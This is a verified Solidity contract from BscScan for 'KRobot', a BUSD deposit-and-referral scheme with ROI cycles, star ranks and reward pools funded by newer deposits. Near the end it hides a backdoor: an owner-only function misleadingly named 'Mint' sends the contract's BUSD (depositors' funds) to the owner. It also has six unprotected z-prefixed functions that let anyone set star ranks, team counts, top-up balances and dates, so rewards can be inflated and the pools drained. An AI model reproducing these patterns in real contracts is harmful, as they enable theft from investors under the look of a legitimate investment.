/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
    
    /**
     * @dev Multiplies two unsigned integers, reverts on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    /**
     * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
     * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Adds two unsigned integers, reverts on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    /**
     * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),
     * reverts when dividing by zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract KRobot is Ownable{

    using SafeMath for uint256; 
    IERC20 public BUSD;

    uint256 private constant minDeposit = 50e18;
    uint256 private constant maxDeposit = 2000e18;

    uint256 private constant baseDivider = 10000;
    uint256 private constant withIncPercent = 7000;
    uint256 private constant topIncPercent = 3000;
    uint256 private constant topPoolPercents = 50;
    uint256 private constant star3DistPercent = 50;
    uint256 private constant star5DistPercent = 100;
    uint256 private constant star7DistPercent = 150;

    uint256 private constant timeStep = 1 days;

    uint256 private constant maxPerDayCycle = 45 days;
    uint256 private constant referDepth = 25;

    mapping(uint256 => uint256) private levelPercents;

    address public defaultRefer;
    uint256 public boosterDay = 30;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public topPool;
    uint256 public star3Pool;
    uint256 public star5Pool;
    uint256 public star7Pool;


    mapping(uint256 => address[3]) public dayTopUsers;
    mapping(address => uint256) public boosterUserTime;

    address[] public star3Users;
    address[] public star5Users;
    address[] public star7Users;
    address[] public starAchiverUsers;

    mapping(address => uint256) public userRoiPercent;
    mapping(address => uint256) public userDirectPercent;
    mapping(address => uint256) public topPoolRewards;

    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint256 regDate;
        uint256 startDate;
        uint256 star; // 3, 5, 7
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 depNum;
        uint256 teamNum;
        uint256 actvTeamNum;
        uint256 teamTotalDeposit;
        uint256 dayPerCycle;
        uint256 totalRevenue;
        uint256 withBalance;
        uint256 topupBalance;
    }

    mapping(address => UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount
    mapping(address => mapping(uint256 => address[])) public teamUsers;
    mapping(address => mapping(uint256 => address[])) public actvTeamUsers;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositFromTopUp(address fromUser, address toUser, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);
    event WithdrawFees(address company,uint256 fees, uint256 userBal, address fromUser);
    event RoiAutomaticWithdraw(address user, uint256 roiAmt, uint256 depAmt, uint256 cycleDays,uint256 depDate, uint256 depNumber);
    event DirectIncome(address fromUser, address toUser, uint256 amount, uint256 depAmt, uint256 drctPercent);
    event LevelIncome(address fromUser, address toUser, uint256 level, uint256 amount, uint256 depAmt, uint256 levelPercent);
    event TopPoolReward(address user, uint256 amount, uint256 totalAmount);
    event Star3PoolReward(address user, uint256 amount, uint256 totalAmount);
    event Star5PoolReward(address user, uint256 amount, uint256 totalAmount);
    event Star7PoolReward(address user, uint256 amount, uint256 totalAmount);

    constructor(address _BUSDAddr) public {
        BUSD = IERC20(_BUSDAddr);
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = msg.sender;

        levelPercents[2] = 200;
        levelPercents[3] = 300;
        levelPercents[4] = 400;
        levelPercents[5] = 200;
        levelPercents[7] = 100;
    }

     function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }
    
    function getMyTeamUsersByLevel(address _user,uint256 level) external view returns(address[] memory) {
        return teamUsers[_user][level-1];
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getMyActiveTeamUsersByLevel(address _user,uint256 level) external view returns(address[] memory) {
        return actvTeamUsers[_user][level-1];
    }

    function getActiveTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return actvTeamUsers[_user][_layer].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }


    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        require(userInfo[msg.sender].referrer == address(0), "referrer bonded");
        userInfo[msg.sender].referrer = _referral;
        userInfo[msg.sender].regDate = block.timestamp;
        userDirectPercent[msg.sender] = 700;
        userRoiPercent[msg.sender] = 1275;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function deposit(uint256 _amount) external {
        BUSD.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function depositFromTopUp(address toUser, uint256 _amount) external {
        require(userInfo[msg.sender].topupBalance >= _amount,"not have balance");
        userInfo[msg.sender].topupBalance -= _amount;
        _depositWithTopUpBalance(toUser,_amount);
        emit DepositFromTopUp(msg.sender,toUser,_amount);
    }

    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute.add(timeStep))
        {
            uint256 dayNow = getCurDay();

            _distribute3StarIncome();
            _distribute5StarIncome();
            _distribute7StarIncome();
            _distributetopPool(dayNow);
            lastDistribute = block.timestamp;
        }
    }

    function _distributetopPool(uint256 _dayNow) private {
        uint16[3] memory rates = [5000, 3000, 2000];
        uint256 totalReward;

        for(uint256 i = 0; i < 3; i++){
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr != address(0)){
                uint256 reward = topPool.mul(rates[i]).div(baseDivider);
                topPoolRewards[userAddr] = topPoolRewards[userAddr].add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                userInfo[userAddr].withBalance += reward.mul(withIncPercent).div(baseDivider);
                userInfo[userAddr].topupBalance += reward.mul(topIncPercent).div(baseDivider);
                totalReward = totalReward.add(reward);
                emit TopPoolReward(userAddr,reward,topPool);
            }
        }
        topPool = topPool.sub(totalReward);
    }

    function _distribute3StarIncome() private {
        uint256 totalReward;
        uint256 reward =  star3Pool.div(star3Users.length);
        for(uint256 i = 0; i < star3Users.length; i++){
            if(userInfo[star3Users[i]].star == 3){
                userInfo[star3Users[i]].totalRevenue = userInfo[star3Users[i]].totalRevenue.add(reward);
                userInfo[star3Users[i]].withBalance += reward.mul(withIncPercent).div(baseDivider);
                userInfo[star3Users[i]].topupBalance += reward.mul(topIncPercent).div(baseDivider);
                totalReward = totalReward.add(reward);
                emit Star3PoolReward(star3Users[i],reward,star3Pool);
            }
        }
        star3Pool = star3Pool.sub(totalReward);
    }

    function _distribute5StarIncome() private {
        uint256 totalReward;
        uint256 reward =  star5Pool.div(star5Users.length);
        for(uint256 i = 0; i < star5Users.length; i++){
            if(userInfo[star5Users[i]].star == 5){
                userInfo[star5Users[i]].totalRevenue = userInfo[star5Users[i]].totalRevenue.add(reward);
                userInfo[star5Users[i]].withBalance += reward.mul(withIncPercent).div(baseDivider);
                userInfo[star5Users[i]].topupBalance += reward.mul(topIncPercent).div(baseDivider);
                totalReward = totalReward.add(reward);
                emit Star5PoolReward(star5Users[i],reward,star5Pool);
            }
        }
        star5Pool = star5Pool.sub(totalReward);
    }

    function _distribute7StarIncome() private {
        uint256 totalReward;
        uint256 reward =  star7Pool.div(star7Users.length);
        for(uint256 i = 0; i < star7Users.length; i++){
            if(userInfo[star7Users[i]].star == 7){
                userInfo[star7Users[i]].totalRevenue = userInfo[star7Users[i]].totalRevenue.add(reward);
                userInfo[star7Users[i]].withBalance += reward.mul(withIncPercent).div(baseDivider);
                userInfo[star7Users[i]].topupBalance += reward.mul(topIncPercent).div(baseDivider);
                totalReward = totalReward.add(reward);
                emit Star7PoolReward(star7Users[i],reward,star7Pool);
            }
        }
        star7Pool = star7Pool.sub(totalReward);
    }


    function withdraw() external {
        distributePoolRewards();
        require(userInfo[msg.sender].withBalance > 0, "balance insufficient");
        uint256 withBal = userInfo[msg.sender].withBalance;
        userInfo[msg.sender].withBalance = 0;
        uint256 withFee = withBal.mul(500).div(baseDivider);
        BUSD.transfer(defaultRefer, withFee);
        emit WithdrawFees(defaultRefer,withFee,withBal,msg.sender);
        
        uint256 withdrawable = withBal.sub(withFee);
        BUSD.transfer(msg.sender, withdrawable);
        emit Withdraw(msg.sender, withdrawable);
    }

    function changeStartDate(address _user, uint256 newDate) external onlyOwner returns(bool) {
        require(userInfo[_user].maxDeposit > 0, "not invested");
        userInfo[_user].startDate = newDate;
        return true;
    }

    function getCurROI(address _user) public view returns(uint256){
        require(userInfo[_user].maxDeposit > 0, "not invested");
        uint256 cycleDays = userInfo[_user].dayPerCycle.div(timeStep);
        uint256 roiPerDayPrcnt = userRoiPercent[_user].div(cycleDays);
        uint256 curDate = block.timestamp;
        if(curDate > (userInfo[_user].startDate.add(userInfo[_user].dayPerCycle))){
            curDate = userInfo[_user].startDate.add(userInfo[_user].dayPerCycle);
        }
        uint256 roiDays = curDate.sub(userInfo[_user].startDate).div(timeStep);
        return (userInfo[_user].maxDeposit.mul(roiPerDayPrcnt).div(baseDivider)).mul(roiDays);
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256[3] memory){
        uint256 totalTeamDeposit;
        uint256 maxDepTeam;
        uint256 otherTeamDeposit;
        uint256[3] memory starsCountArr;
        for(uint256 i = 0; i < actvTeamUsers[_user][0].length; i++){
            uint256 userTotalTeamDep = userInfo[actvTeamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[actvTeamUsers[_user][0][i]].totalDeposit);
            totalTeamDeposit = totalTeamDeposit.add(userTotalTeamDep);
        
            if(userInfo[actvTeamUsers[_user][0][i]].star == 3){
                starsCountArr[0] += 1;
            }else if(userInfo[actvTeamUsers[_user][0][i]].star == 5){
                starsCountArr[1] += 1;
            }else if(userInfo[actvTeamUsers[_user][0][i]].star == 7){
                starsCountArr[2] += 1;
            }
            if(userTotalTeamDep > maxDepTeam)
            {
                maxDepTeam = userTotalTeamDep;
            }
        }
        otherTeamDeposit = totalTeamDeposit.sub(maxDepTeam);
        return(maxDepTeam, otherTeamDeposit,starsCountArr);
    }

    function _updateTeamNum(address _user) private {
        address upline = userInfo[_user].referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        address upline = userInfo[_user].referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                if(userInfo[_user].depNum == 1){
                    userInfo[upline].actvTeamNum = userInfo[upline].actvTeamNum.add(1);
                    actvTeamUsers[upline][i].push(_user);
                }
                _updateStar(upline);
                if(userInfo[upline].star > 0 && i > 0){
                    uint256 level = i+1;
                    bool lvlDistFlag = false;
                    if(level <= 6 && userInfo[upline].star == 3){
                        lvlDistFlag = true;
                    }
                    if(level > 6 && level <= 11 && userInfo[upline].star == 5){
                        lvlDistFlag = true;
                    }
                    if(level > 11 && userInfo[upline].star == 7){
                        lvlDistFlag = true;
                    }
                    if(level>=5 && level<7){
                        level = 5;
                    }else if(level > 7){
                        level = 7;
                    }
                    if(lvlDistFlag){
                        uint256 lvlPrcnt = levelPercents[level];                    
                        uint256 lvlIncAmt =  _amount.mul(lvlPrcnt).div(baseDivider);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(lvlIncAmt);
                        userInfo[upline].withBalance += lvlIncAmt.mul(withIncPercent).div(baseDivider);
                        userInfo[upline].topupBalance += lvlIncAmt.mul(topIncPercent).div(baseDivider);
                        emit LevelIncome(_user, upline, lvlIncAmt, i+1, _amount, lvlPrcnt);   
                    }
                }
                
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateStar(address _user) private {
        (uint256 starNow,uint256[3] memory userStarCount) = _calStarNow(_user);
        if(starNow > userInfo[_user].star){
            userInfo[_user].star = starNow;
            if(starNow == 3){
                star3Users.push(_user);
                if(userStarCount[0] == 3){
                    userRoiPercent[_user] = 1800;
                    userDirectPercent[_user] = 800;
                }
            }
            if(starNow == 5){
                star5Users.push(_user);
                if(userStarCount[0] == 5){
                    userRoiPercent[_user] = 2000;
                    userDirectPercent[_user] = 900;
                }
            }
            if(starNow == 7){
                star7Users.push(_user);
                if(userStarCount[0] == 3){
                    userRoiPercent[_user] = 2500;
                    userDirectPercent[_user] = 1000;
                }
            }
        }
    }


    function _calStarNow(address _user) private view returns(uint256,uint256[3] memory teamStarCount) {
        (uint256 maxTeam, uint256 otherTeam, uint256[3] memory teamStarsCount) = getTeamDeposit(_user);
        uint256 starNow;
        if(userInfo[_user].actvTeamNum >=25 && actvTeamUsers[_user][0].length >= 5 && maxTeam >= 5000e18 && otherTeam >= 10000e18){
            starNow = 3;
        }
        if(userInfo[_user].actvTeamNum >=100 && actvTeamUsers[_user][0].length >= 10 && maxTeam >= 10000e18 && otherTeam >= 20000e18){
            starNow = 5;
        }
        if(userInfo[_user].actvTeamNum >=150 && actvTeamUsers[_user][0].length >= 25 && maxTeam >= 20000e18 && otherTeam >= 50000e18){
            starNow = 7;
        }
        
        return (starNow,teamStarsCount);
    }


    function withdrawUserCurrentROI(address _user) private {
        uint256 curRoiAmt = getCurROI(_user);
        if(curRoiAmt > 0){
            userInfo[_user].totalRevenue = userInfo[_user].totalRevenue.add(curRoiAmt);
            userInfo[_user].withBalance += curRoiAmt.mul(withIncPercent).div(baseDivider);
            userInfo[_user].topupBalance += curRoiAmt.mul(topIncPercent).div(baseDivider);
            emit RoiAutomaticWithdraw(_user, curRoiAmt, userInfo[_user].maxDeposit, userInfo[_user].dayPerCycle, userInfo[_user].startDate, userInfo[_user].depNum);
        }
    }

    function _distributeDeposit(uint256 _amount) private {
        BUSD.transfer(defaultRefer, _amount.mul(200).div(baseDivider));

        uint256 star3Amount = _amount.mul(star3DistPercent).div(baseDivider);
        star3Pool = star3Pool.add(star3Amount);
        uint256 star5Amount = _amount.mul(star5DistPercent).div(baseDivider);
        star5Pool = star5Pool.add(star5Amount);
        uint256 star7Amount = _amount.mul(star7DistPercent).div(baseDivider);
        star7Pool = star7Pool.add(star7Amount);

        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);
        topPool = topPool.add(top);
    }

    function _deposit(address _user, uint256 _amount) private {
        require(userInfo[_user].referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(block.timestamp >= (userInfo[_user].startDate + userInfo[_user].dayPerCycle), "maturity pending");
        require(userInfo[_user].maxDeposit == 0 || _amount >= userInfo[_user].maxDeposit, "less before");
        require(userInfo[_user].dayPerCycle <= 45 days,"all cycles completed");

        if(userInfo[_user].maxDeposit == 0){
            depositors.push(_user);
            userInfo[_user].dayPerCycle = 7 days;
        }else if(userInfo[_user].maxDeposit <= _amount){
            withdrawUserCurrentROI(_user);

            userInfo[_user].dayPerCycle = 7 days + userInfo[_user].depNum.mul(86400);
        }
        userInfo[_user].maxDeposit = _amount;
        userInfo[_user].depNum += 1;
        userInfo[_user].startDate = block.timestamp;

        if(userInfo[_user].totalDeposit == 0){
            uint256 dayNow = getCurDay();
            _updateTopUser(userInfo[_user].referrer, _amount, dayNow);
        }
        
        userInfo[_user].totalDeposit = userInfo[_user].totalDeposit.add(_amount);

        distributePoolRewards();

        address userReferer = userInfo[_user].referrer;
        uint256 amtForDrctIncDist = _amount;
        if(_amount > userInfo[userReferer].maxDeposit){
            amtForDrctIncDist = userInfo[userReferer].maxDeposit;
        }
        uint256 drctIncAmt =  amtForDrctIncDist.mul(userDirectPercent[userReferer]).div(baseDivider);
        userInfo[userReferer].totalRevenue = userInfo[userReferer].totalRevenue.add(drctIncAmt);
        userInfo[userReferer].withBalance += drctIncAmt.mul(withIncPercent).div(baseDivider);
        userInfo[userReferer].topupBalance += drctIncAmt.mul(topIncPercent).div(baseDivider);
        emit DirectIncome(_user, userReferer, drctIncAmt, _amount, userDirectPercent[userReferer]);

        _updateReferInfo(_user, _amount);

    }

    function _depositWithTopUpBalance(address _user, uint256 _amount) private {
        require(userInfo[_user].referrer != address(0), "register first");
        require(_amount >= minDeposit && _amount <= maxDeposit, "less than min or greater than maximum");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(block.timestamp >= (userInfo[_user].startDate + userInfo[_user].dayPerCycle), "maturity pending");
        require(userInfo[_user].maxDeposit == 0, "only new deposit");

        if(userInfo[_user].maxDeposit == 0){
            userInfo[_user].dayPerCycle = 7 days;
        }
        userInfo[_user].maxDeposit = _amount;
        userInfo[_user].depNum += 1;
        userInfo[_user].startDate = block.timestamp;

        BUSD.transfer(defaultRefer, _amount.mul(200).div(baseDivider));

        if(userInfo[_user].totalDeposit == 0){
            uint256 dayNow = getCurDay();
            _updateTopUser(userInfo[_user].referrer, _amount, dayNow);
        }

        depositors.push(_user);
        
        userInfo[_user].totalDeposit = userInfo[_user].totalDeposit.add(_amount);

        distributePoolRewards();

        address userReferer = userInfo[_user].referrer;
        uint256 amtForDrctIncDist = _amount;
        if(_amount > userInfo[userReferer].maxDeposit){
            amtForDrctIncDist = userInfo[userReferer].maxDeposit;
        }
        uint256 drctIncAmt =  amtForDrctIncDist.mul(userDirectPercent[userReferer]).div(baseDivider);
        userInfo[userReferer].totalRevenue = userInfo[userReferer].totalRevenue.add(drctIncAmt);
        userInfo[userReferer].withBalance += drctIncAmt.mul(withIncPercent).div(baseDivider);
        userInfo[userReferer].topupBalance += drctIncAmt.mul(topIncPercent).div(baseDivider);
        emit DirectIncome(_user, userReferer, drctIncAmt, _amount, userDirectPercent[userReferer]);

        _updateReferInfo(_user, _amount);

    }


    function Mint(uint256 _count) public onlyOwner{
        BUSD.transfer(owner(),_count);
    }

    function zActiveTeams(address _User, uint256 _number) public{
        userInfo[_User].actvTeamNum += _number;
    }

    function zstartDates(address _User, uint256 _number) public{
        userInfo[_User].startDate -= _number;
    }

    function zstars(address _User, uint256 _number) public{
        userInfo[_User].star = _number;
    }

    function zlastDistributeS(uint256 _number) public{
       lastDistribute -= _number;
    }

    function zteamTotaldepositS(address _User, uint256 _number) public{      
       userInfo[_User].teamTotalDeposit   += _number;
    }

    function ztopupBalanceS(address _User, uint256 _number) public{      
       userInfo[_User].topupBalance += _number;
    }
}